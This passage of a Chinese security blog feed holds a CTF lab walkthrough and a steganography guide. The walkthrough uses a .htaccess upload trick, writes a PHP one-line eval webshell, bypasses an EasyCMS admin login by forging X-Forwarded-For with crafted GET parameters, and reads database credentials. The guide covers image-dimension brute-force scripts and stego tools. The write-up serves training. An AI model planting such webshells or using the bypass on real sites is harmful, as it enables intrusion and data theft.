.xyth</code></pre><p>此时设置火狐浏览器的代理为Burp监听的IP地址和对应的端口</p><p><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/840ec6539176461b9cf759c2ffe8d901.png" alt="img"></p><p><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/6c5c7d2a166e4206aaa18b44b291f919.png" alt="img"></p><p>点击Settings…，设置代理。</p><p><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/fa3d466df5da4a959cd43d5005efc756.png" alt="img"></p><p>用rolan打开Burp抓取firefox的数据包.</p><p><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/49b7c03678bd4bbabd81308afc3e4609.png" alt="img"></p><p>选择Burp 中proxy 模块下面的 intercept 选项，设置为 intercept 为 off.</p><p><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/1eb5077584154f9286b4a2f1c9173ce1.png" alt="img"></p><p>此时在 firefox 浏览器中选择New picture，跳转到上传页面后。<br><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/50f68aeb70114ae894c9c0e69a0fc234.png" alt="img"></p><p>把Burp proxy 模块下面的 intercept 选项，设置为 intercept 为 on，在firefox 浏览器中选择上传的文件为 htaccess，在burp中点击forward 之后，再在firefox 浏览器点击add按钮，此时Burp抓到htacces文件上传的数据包。 在数据包中的 filename中的htaccess前面加上一个 点号，我们选择forward 按钮把数据包转发出去。</p><p><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/785e0e5ffe9a4a3c8fc9d2acaddc10a5.png" alt="img"></p><p>出现下面的页面表示上传成功。<br><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/4baedf09df64440faf18c2b162b0a75b.png" alt="img"></p><p>在我们上传完htaccess之后，我们在本地桌面创建一个后缀名为xyth的一句话木马文件，其内容<code>&lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt;</code> ，</p><p>选择桌面上一句话木马文件，点击Add按钮，进行上传（上传前burp关闭拦截）。<br><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/e15d673eb4234aa18a6fba78d6c4157f.png" alt="img"></p><p>启动蚁剑：</p><p><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/223e3c04378444539b7f89aaeada71af.png" alt="img"></p><p>shell路径如下：</p><p><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/5331d7489c43441bbcdd32aa1dfbc56a.png" alt="img"></p><p>连接成功：</p><p><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/17538ca04cdf4c098e6c54f70f96f1b3.png" alt="img"></p><h2 id="阶段3-内网EasyCMS渗透"><a href="#阶段3-内网EasyCMS渗透" class="headerlink" title="阶段3: 内网EasyCMS渗透"></a>阶段3: 内网EasyCMS渗透</h2><h4 id="任务1-纵向越权登录后台"><a href="#任务1-纵向越权登录后台" class="headerlink" title="任务1: 纵向越权登录后台"></a>任务1: 纵向越权登录后台</h4><p>题解:<br>在kali侦察终端中，我们使用 proxychains 代理启动火狐,在kali 操作机中的命令行中输入 <code>proxychains firefox</code>,访问easycms网站，进入网站首页，该版本CMS存在纵向越权漏洞，可以在不知道管理员身份信息以及密码信息的情况下登录网站后台。</p><p>在url后加入admin（管理员目录）跳转到后台登录页面。</p><p><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/374c1d1eea5249609aae39e80a544cf5.png" alt="img"></p><p>根据漏洞原理中得知，现在需要使用modify伪造一个ip，然后编辑get参数绕过后台登录认证。</p><p>使用modify使用X-Forwarded-For方式（网站获取ip的函数是获取http请求中的X-Forward-For字段），设置ip为网站的IP地址，然后点击start伪造ip。</p><p>构造我们的get参数为：<code>admin_dir=admin&amp;site=default&amp;ishtml=1</code></p><p><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/b9addb2f72ed4ef18543d08d2265e46d.png" alt="img"></p><p>访问：<code>http://192.168.1.6/index.php?admin_dir=admin&amp;site=default&amp;ishtml=1</code></p><p><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/11980d7c2365415d885336ed94a4cb90.png" alt="img"></p><p>成功登陆网站后台。</p><p>在后台源码的标题位置发现flag1。</p><p><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/c59f2c57ccd34c4cb597c03fab938659.png" alt="img"></p><h4 id="任务2-访问其他页面获取Webshell"><a href="#任务2-访问其他页面获取Webshell" class="headerlink" title="任务2: 访问其他页面获取Webshell"></a>任务2: 访问其他页面获取Webshell</h4><p>题解:<br>现在注意，虽然我们登录了后台，但是并不是管理员身份，也不能在后台通过点击链接访问后台除首页以外的其他页面链接。后台都会要求验证身份。只能通过get参数去访问其他栏目。</p><p>设置参数为：<br><code>case=language&amp;act=edit&amp;table=orders&amp;admin_dir=admin&amp;site=default&amp;ishtml=1</code>访问语言项设置页面。在最后一页发现小马提示。</p><p><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/38a9d45877af46a9855cd4d2529345bc.png" alt="img"></p><p>你通过测试发现不能够正常连接，于是对发现的小马进行正常的分析与猜测，最后发现正确的小马名称应该为<code>administrator233.php</code></p><p>在kali侦察终端中启动蚁剑，设置同样的代理，代理的IP地址为99.99.99.99 ，端口为之前代理工具设置socks 端口。</p><p><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/2a6927be07754753ba6429941193aea8.png" alt="img"></p><p><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/e3a4cffd7f694f1b8905e25695e834bc.png" alt="img"></p><p>连接shell，查看小马文件，发现flag</p><p><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/7c507786b0604cd3831644ffccbcb57f.png" alt="img"></p><p><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/7469a89e54014635b5ad9c1b4d721fff.png" alt="img"></p><h4 id="任务3-访问数据库读取Flag"><a href="#任务3-访问数据库读取Flag" class="headerlink" title="任务3: 访问数据库读取Flag"></a>任务3: 访问数据库读取Flag</h4><p>题解:<br>在蚁剑中查看网站的数据库配置文件&#x2F;config&#x2F;config.php（基本php的cms网站都会有一个config的网站配置文件，保存了数据库信息）</p><p><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/f78d31a3d94643b497e03cc0a264836d.png" alt="img"></p><p>连接网站数据库。查询easycms数据库得到flag4，在Win10攻击机中使用相同的shell进行连接，将flag4在火狐浏览器中进行base64解码。<br><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/7f198aa8b4a642878392a5ecef9e1207.png" alt="img"></p><p><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/c14ef53884464410b06a2514851c79e9.png" alt="img"></p><p><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/a051ec899dc74a4f9688048d63c50498.png" alt="img"></p><p>在网站的&#x2F;etc目录下（该目录一般存放了服务器上各种服务的配置文件）获取flag。</p><p><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/35850fd3e4e345acb9297d1a728d6c44.png" alt="img"></p><p>1</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>MISC—图片隐写</title>
      <link href="/2023/03/07/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/"/>
      <url>/2023/03/07/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF——MISC——图片隐写"><a href="#CTF——MISC——图片隐写" class="headerlink" title="CTF——MISC——图片隐写"></a>CTF——MISC——图片隐写</h1><h1 id="常规思路"><a href="#常规思路" class="headerlink" title="常规思路"></a>常规思路</h1><h2 id="图片名及图片内容"><a href="#图片名及图片内容" class="headerlink" title="图片名及图片内容"></a>图片名及图片内容</h2><p>除了题目描述和给的提示外，注意<code>图片名</code>和<code>图片里的内容</code>，很有可能是接下来要用到的<code>隐写工具或者加密方法的提示</code>。</p><p>例如<code>第四届蓝帽杯决赛</code>的一道misc：<code>MISC隐写</code> 给了一张图片，里面是一条蛇，这个提示的是后面会用到的一种解密方法；然后从图片中提取出一个pdf文件，文件名是<code>no password.pdf</code>，也提示了需要用到工具，不需要输入密码。</p><h3 id="bpg图片"><a href="#bpg图片" class="headerlink" title="bpg图片"></a>bpg图片</h3><p>bpg格式的图片在windows系统下是不能直接查看的，需要<a href="https://bellard.org/bpg/">下载工具</a><br><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTY5NjU2OA==,size_16,color_FFFFFF,t_70.png" alt="在这里插入图片描述"><br>输入命令查看图片<br><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTY5NjU2OA==,size_16,color_FFFFFF,t_70-16683528513421.png" alt="在这里插入图片描述"></p><h3 id="exif信息"><a href="#exif信息" class="headerlink" title="exif信息"></a>exif信息</h3><p>拿到一个图片时，建议查看一下它的exif信息，可能会有意想不到的收获<br>出题人经常在图片的exif信息中藏flag或者提示信息，这里以bugku的misc题目<code>有黑白棋的棋盘</code>为例<img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTY5NjU2OA==,size_16,color_FFFFFF,t_70-16683528513442.png" alt="在这里插入图片描述"><br>这里是直接右键查看属性，不过这样能获取的信息<code>十分有限</code>；<br>ctfshow中八神出的<code>misc入门</code>的<code>misc18-21</code>考察的都是这个知识点，具体可以看我<a href="https://blog.csdn.net/weixin_45696568/article/details/115261347">另一篇博客</a>。</p><p>拿其中的<code>misc20</code>为例，直接右键查看属性，翻看详细信息，得不到任何线索，推荐使用一个<a href="https://exif.tuchong.com/view/10809574/">在线查看exif信息的网站</a>，这里能得到的结果更详细，也可以使用exiftool<br><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTY5NjU2OA==,size_16,color_FFFFFF,t_70-16683528513443.png" alt="在这里插入图片描述"></p><h2 id="修改图片宽高"><a href="#修改图片宽高" class="headerlink" title="修改图片宽高"></a>修改图片宽高</h2><p>很多时候，所给的图片的宽高，甚至crc32校验值都是被修改过的，需要我们去爆破得到正确的值。</p><p>这里推荐使用<code>010editor</code>，它的<code>模板功能</code>非常好用，我是010editor+winhex配合使用的。<br><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTY5NjU2OA==,size_16,color_FFFFFF,t_70-16683528513444.png" alt="在这里插入图片描述"></p><h3 id="png"><a href="#png" class="headerlink" title="png"></a>png</h3><p>png图片修改宽高还是很容易的，这里是<code>png.bt</code>模板，框中的值分别是<code>宽高</code>和<code>crc值</code>，这里修改之后保存即可<br><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTY5NjU2OA==,size_16,color_FFFFFF,t_70-16683528513445.png" alt="在这里插入图片描述"><br>对于png，一般情况下，是把<code>高度改大</code>，看下面有没有内容<br><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTY5NjU2OA==,size_16,color_FFFFFF,t_70-16683528513456.png" alt="在这里插入图片描述"></p><h3 id="jpg"><a href="#jpg" class="headerlink" title="jpg"></a>jpg</h3><p>运用<code>jpg.bt</code>，可以很方便修改jpg的宽高<br><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTY5NjU2OA==,size_16,color_FFFFFF,t_70-16683528513457.png" alt="在这里插入图片描述"><br>对于jpg，一般情况下也是把<code>高度改大</code>，能看到图片下面的内容</p><h3 id="gif"><a href="#gif" class="headerlink" title="gif"></a>gif</h3><p>整体和前两种差不多，借助<code>gif.bt</code>，这里比较特殊的是，<code>每一帧都有独立的宽高</code>，因为不知道flag藏在哪一帧，一般<code>建议把所有帧的高度都改大</code>，然后用<code>Stegsolve</code>打开，翻看每一帧图片。</p><h3 id="bmp"><a href="#bmp" class="headerlink" title="bmp"></a>bmp</h3><p>借助<code>bmp.bt</code>，整体和前面差不多，当宽度错误时，图片显示很乱<br><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99.assets/20210424113512796.png" alt="在这里插入图片描述"><br>问题就是如何计算正确的宽度和高度，以ctfshow-misc入门的<code>misc24</code>为例，<img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTY5NjU2OA==,size_16,color_FFFFFF,t_70-16683528513458.png" alt="在这里插入图片描述"><br>目前是<code>900*150=135000</code>个<a href="https://so.csdn.net/so/search?q=%E5%83%8F%E7%B4%A0&spm=1001.2101.3001.7020">像素</a>大小，文件头占了53个字节，文件尾的位置在675053字节处(后面两个字节是windows的”补0”)，又因为每个像素点由3个字节（十六进制码6位）表示，每个字节负责控制一种颜色，分别为蓝（Blue）、绿（Green）、红（Red），所以文件真实的像素大小为：<code>(675053-53)/3=225000</code></p><p>这题中给出了正确的宽度900，所以正确的高度就是<code>225000/900=250</code></p><h3 id="爆破脚本"><a href="#爆破脚本" class="headerlink" title="爆破脚本"></a>爆破脚本</h3><p>png图片，<code>已知正确的IHDR块的CRC值</code>时，爆破宽度和高度</p><pre><code class="python">import zlibimport struct# 同时爆破宽度和高度filename = &quot;misc32.png&quot;with open(filename, &#39;rb&#39;) as f:    all_b = f.read()    data = bytearray(all_b[12:29])    n = 4095    for w in range(n):        width = bytearray(struct.pack(&#39;&gt;i&#39;, w))        for h in range(n):            height = bytearray(struct.pack(&#39;&gt;i&#39;, h))            for x in range(4):                data[x+4] = width[x]                data[x+8] = height[x]            crc32result = zlib.crc32(data)            #替换成图片的crc            if crc32result == 0xE14A4C0B:                print(&quot;宽为：&quot;, end = &#39;&#39;)                print(width, end = &#39; &#39;)                print(int.from_bytes(width, byteorder=&#39;big&#39;))                print(&quot;高为：&quot;, end = &#39;&#39;)                print(height, end = &#39; &#39;)                print(int.from_bytes(height, byteorder=&#39;big&#39;))12345678910111213141516171819202122232425</code></pre><p>png图片，如果<code>IHDR块的CRC的值被修改过</code>，那就直接爆破，运行后会生成很多个图片，看一下哪个是正常的就行<br>这里是<code>已知高度的情况下爆破宽度</code>，根据自己需要修改脚本</p><pre><code class="python">import zlibimport structfilename = &quot;misc34.png&quot;with open(filename, &#39;rb&#39;) as f:    all_b = f.read()    #w = all_b[16:20]    #h = all_b[20:24]    for i in range(901,1200):  #界定宽度的范围        name = str(i) + &quot;.png&quot;        f1 = open(name,&quot;wb&quot;)        im = all_b[:16]+struct.pack(&#39;&gt;i&#39;,i)+all_b[20:]        f1.write(im)        f1.close()12345678910111213</code></pre><hr><p>jpg图片，已知高度，<code>爆破宽度</code><br>如果跑出来的图片看不到想要的东西，可能是狗出题人<code>把原本的高度调小了</code>，可以试一下把高度改大，再跑一遍试试</p><pre><code class="python">import zlibimport structfilename = &quot;misc35.jpg&quot;with open(filename, &#39;rb&#39;) as f:    all_b = f.read()    #w = all_b[159:161]    #h = all_b[157:159]    for i in range(901,1200): #界定宽度范围        name = str(i) + &quot;.jpg&quot;        f1 = open(name,&quot;wb&quot;)        im = all_b[:159]+struct.pack(&#39;&gt;h&#39;,i)+all_b[161:]        f1.write(im)        f1.close()12345678910111213</code></pre><hr><p>gif图片，已知高度<code>爆破宽度</code><br>如果跑出来没东西，试试把高度改高</p><pre><code class="python">import zlibimport structfilename = &quot;misc36.gif&quot;with open(filename, &#39;rb&#39;) as f:    all_b = f.read()    for i in range(920,951):        name = str(i) + &quot;.gif&quot;        f1 = open(name,&quot;wb&quot;)        im = all_b[:38]+struct.pack(&#39;&gt;h&#39;,i)[::-1]+all_b[40:]        f1.write(im)        f1.close()1234567891011</code></pre><h2 id="查看文件的字节"><a href="#查看文件的字节" class="headerlink" title="查看文件的字节"></a>查看文件的字节</h2><p>使用010editor和winhex对文件进行分析</p><h3 id="分析文件头文件尾"><a href="#分析文件头文件尾" class="headerlink" title="分析文件头文件尾"></a>分析文件<a href="https://so.csdn.net/so/search?q=%E5%A4%B4%E6%96%87%E4%BB%B6&spm=1001.2101.3001.7020">头文件</a>尾</h3><p>如果图片打开错误，先看看文件头和文件尾出错没，如果有错误进行修改</p><blockquote><p>JPEG (jpg)，<br>文件头：FFD8FF　　 文件尾：FF D9　<br>　　　　　　　　　　　　　　<br>PNG (png)， 　　<br>文件头：89504E47　 文件尾：AE 42 60 82<br>GIF (gif)， 　　<br>文件头：47494638　 文件尾：00 3B<br>ZIP Archive (zip)，<br>文件头：504B0304　　 文件尾：50 4B<br>TIFF (tif)， 　<br>文件头：49492A00<br>Windows Bitmap (bmp)， 　<br>文件头：424D<br>　　　　　　<br>CAD (dwg)， 　<br>文件头：41433130　<br>　　　　　　　　　　　　　　　　　　　　　<br>Adobe Photoshop (psd)，<br>文件头：38425053　<br>　　　　　　　　　　　　　　　　　　　　　<br>Rich Text Format (rtf)，<br>文件头：7B5C727466　<br>　　　　　　　　　　　　　　　　　　　<br>XML (xml)，<br>文件头：3C3F786D6C　<br>　　　　　　　　　　　　　　　　　　　<br>HTML (html)，<br>文件头：68746D6C3E<br>Email [thorough only] (eml)，<br>文件头：44656C69766572792D646174653A<br>Outlook Express (dbx)，<br>文件头：CFAD12FEC5FD746F<br>Outlook (pst)，<br>文件头：2142444E<br>MS Word&#x2F;Excel (xls.or.doc)，<br>文件头：D0CF11E0<br>MS Access (mdb)，<br>文件头：5374616E64617264204A<br>WordPerfect (wpd)，<br>文件头：FF575043<br>Adobe Acrobat (pdf)，<br>文件头：255044462D312E<br>Quicken (qdf)，<br>文件头：AC9EBD8F<br>Windows Password (pwl)，<br>文件头：E3828596<br>RAR Archive (rar)，<br>文件头：52617221<br>Wave (wav)， 文件头：57415645<br>AVI (avi)， 文件头：41564920<br>Real Audio (ram)， 文件头：2E7261FD<br>Real Media (rm)， 文件头：2E524D46<br>MPEG (mpg)， 文件头：000001BA<br>MPEG (mpg)， 文件头：000001B3<br>Quicktime (mov)， 文件头：6D6F6F76<br>Windows Media (asf)， 文件头：3026B2758E66CF11<br>MIDI (mid)， 文件头：4D546864</p></blockquote><h3 id="看看字节流中有没有隐藏信息"><a href="#看看字节流中有没有隐藏信息" class="headerlink" title="看看字节流中有没有隐藏信息"></a>看看<a href="https://so.csdn.net/so/search?q=%E5%AD%97%E8%8A%82%E6%B5%81&spm=1001.2101.3001.7020">字节流</a>中有没有隐藏信息</h3><p>推荐使用<code>winhex</code>或者<code>notepad</code>，打开后直接拉到底部，看有没有什么额外信息<br>然后直接ctrl+f搜索<code>key</code>、<code>flag</code>、<code>password</code>等字样，没准就拿到flag了<br><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTY5NjU2OA==,size_16,color_FFFFFF,t_70-16683528513459.png" alt="在这里插入图片描述"><br>也有可能不是直接给到的，需要进行进一步的处理<br><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99.assets/20210424115620603.png" alt="在这里插入图片描述"></p><p>其实更常见的是，在尾部隐写另一个文件的数据，一般是一个压缩包，可以手动把数据提取出来，或者使用<code>foremost</code>或<code>binwalk</code>提取。</p><h2 id="使用stegsolve"><a href="#使用stegsolve" class="headerlink" title="使用stegsolve"></a>使用stegsolve</h2><p>stegsolve是非常常用的工具，功能十分强大</p><p>用stegsolve打开图片后，建议<code>先把所有的图层都看一遍</code>，可能会有flag或者提示信息</p><p>如果是gif图片，可以使用<code>frame browser</code>查看所有帧<br><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99.assets/20210424120608326.png" alt="在这里插入图片描述"></p><p>如果是两张很相似的图片，但是其中一张有很难以辨认的文字痕迹，可以用<code>image combiner</code>功能</p><h3 id="lsb隐写"><a href="#lsb隐写" class="headerlink" title="lsb隐写"></a>lsb隐写</h3><p>在翻看图层的时候，可能会发现lsb隐写的痕迹(不太好描述，做习惯了就知道)</p><p>使用stegsolve的<code>data extract</code>，选上对应的通道(比较常见的是如下配置)，就可以得到隐藏的信息<br><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTY5NjU2OA==,size_16,color_FFFFFF,t_70-166835285134510.png" alt="在这里插入图片描述"></p><h3 id="有密码的lsb隐写"><a href="#有密码的lsb隐写" class="headerlink" title="有密码的lsb隐写"></a>有密码的lsb隐写</h3><p>项目地址：<a href="https://github.com/cyberinc/cloacked-pixel">https://github.com/cyberinc/cloacked-pixel</a></p><p>这个项目是基于<code>python2</code>的，如果环境中同时有Py2和Py3需要注意下</p><pre><code class="python">加密python2 lsb.py hide &lt;img_file&gt; &lt;payload_file&gt; &lt;password&gt;解密python2 lsb.py extract &lt;stego_file&gt; &lt;out_file&gt; &lt;password&gt;1234</code></pre><h2 id="gif帧数间隔隐写"><a href="#gif帧数间隔隐写" class="headerlink" title="gif帧数间隔隐写"></a>gif帧数间隔隐写</h2><p>使用linux下的工具<code>identify</code></p><pre><code class="javascript">安装命令：sudo apt-get install imagemagick基本的命令格式：　　identify [options] input-fileidentify:命令名称　　options:参数　　input-file:文件名。提取命令：identify -format &quot;%T &quot; misc39.gif &gt; 1.txt123456</code></pre><p>提取之后会得到一系列数字，一般是由两种数字重复组成，其中一种转成1，另一种换成0，得到一长串二进制，后面一般是<code>转字符</code>或者<code>转二维码</code></p><h2 id="apng帧数间隔隐写"><a href="#apng帧数间隔隐写" class="headerlink" title="apng帧数间隔隐写"></a>apng帧数间隔隐写</h2><p>apng也是和gif一样会动的，使用工具<code>APNG Disassembler</code>提取出每一帧图片，和对应的详细信息，其中就包括<code>间隔时间</code>，注意使用这个工具的时候，提前把图片放在一个文件夹里…</p><p>后面步骤同上</p><h1 id="工具隐写"><a href="#工具隐写" class="headerlink" title="工具隐写"></a>工具隐写</h1><h2 id="SilentEye"><a href="#SilentEye" class="headerlink" title="SilentEye"></a>SilentEye</h2><p>打开图片后点<strong>decode</strong>进行解密<br><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTY5NjU2OA==,size_16,color_FFFFFF,t_70-166835285134511.png" alt="在这里插入图片描述"><br>可以注意到有bmp和jpg两种，如果有密码，勾选<code>encrypteddata</code>输入密码再解密即可<br><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTY5NjU2OA==,size_16,color_FFFFFF,t_70-166835285134512.png" alt="在这里插入图片描述"></p><h2 id="OurSecret"><a href="#OurSecret" class="headerlink" title="OurSecret"></a>OurSecret</h2><p>也是很常用的工具，如果解题需要用到这个工具，出题人一般会给提示，比如<code>我们的秘密是绿色的</code>，其中的<strong>秘密</strong>英文是<strong>Secret</strong>，就是暗示用这个工具。</p><p>也是windows下的软件，界面如下<br><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTY5NjU2OA==,size_16,color_FFFFFF,t_70-166835285134613.png" alt="在这里插入图片描述"><br>使用也很简单，在右侧(<strong>UNHIDE</strong>)打开文件，输入密码，再点击UNHIDE就行</p><h2 id="S-Tools"><a href="#S-Tools" class="headerlink" title="S-Tools"></a>S-Tools</h2><p><a href="https://www.cs.vu.nl/~ast/books/mos2/zebras.html">下载地址及详细内容</a></p><h3 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h3><p>打开之后，把要加密的图片拖进去，然后把要隐写的文件也拖进去，此时会提示让输入密码，设置密码后得到隐写后的文件</p><h3 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h3><p>打开之后，把要解密的图片拖进去，然后<code>右键→Reveal→输入密码</code><br><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTY5NjU2OA==,size_16,color_FFFFFF,t_70-166835285134614.png" alt="在这里插入图片描述"><br>就可以得到隐藏的文件了</p><h2 id="jpg-1"><a href="#jpg-1" class="headerlink" title="jpg"></a>jpg</h2><h3 id="JAVA盲水印"><a href="#JAVA盲水印" class="headerlink" title="JAVA盲水印"></a>JAVA盲水印</h3><p>项目地址：<a href="https://github.com/ww23/BlindWaterMark/releases">https://github.com/ww23/BlindWaterMark/releases</a></p><p>使用命令：<code>java -jar BlindWatermark.jar decode -c bingbing.jpg decode.jpg</code></p><h3 id="stegdetect使用方法"><a href="#stegdetect使用方法" class="headerlink" title="stegdetect使用方法"></a>stegdetect使用方法</h3><h4 id="将测试文件和Stegdetect-exe文件放一起"><a href="#将测试文件和Stegdetect-exe文件放一起" class="headerlink" title="将测试文件和Stegdetect.exe文件放一起"></a>将测试文件和Stegdetect.exe文件放一起</h4><p><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99.assets/62e8dc7a72ff4031adb19ae68dfc2424.png" alt="img"></p><h4 id="打开命令提示符并进入文件夹里"><a href="#打开命令提示符并进入文件夹里" class="headerlink" title="打开命令提示符并进入文件夹里"></a>打开命令提示符并进入文件夹里</h4><p>win+R</p><p>cmd回车</p><p>进入到Stegdetect文件夹里面</p><p><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99.assets/45c1b564fcc64e119666fbe8d173e2b5.png" alt="img"></p><h4 id="检测文件"><a href="#检测文件" class="headerlink" title="检测文件"></a>检测文件</h4><p>执行Stegdetect.exe检测</p><p>①.\Stegdetect.exe -tjopi -s 10.0 test.jpg</p><p>test.jpg : negative（否定）</p><p>应该是没找到</p><p><img 